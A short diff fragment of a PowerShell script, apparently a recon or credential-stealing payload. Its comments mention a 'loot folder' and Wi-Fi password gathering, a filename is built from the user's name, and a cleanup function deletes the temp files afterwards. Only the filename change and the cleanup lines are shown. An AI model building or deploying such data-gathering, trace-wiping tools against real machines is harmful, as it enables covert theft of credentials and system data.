@@ -362,8 +362,7 @@ function Recon{
 
     # MAKE LOOT FOLDER 
 
-    # $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)computer_recon.txt"
-	$FileName = "computer-recon.txt"
+    $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"
 
     ############################################################################################################################################################
 
@@ -514,7 +513,6 @@ function ClearCache {
     Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
     Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
     Remove-Item "$env:TEMP\example-logs.txt" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$env:TEMP\computer-recon.txt" -Force -ErrorAction SilentlyContinue
     # # GetWifiPasswords
     # Remove-Item "$env:TEMP\wifi.txt" -Force -ErrorAction SilentlyContinue
     # # GatherSystemInfo
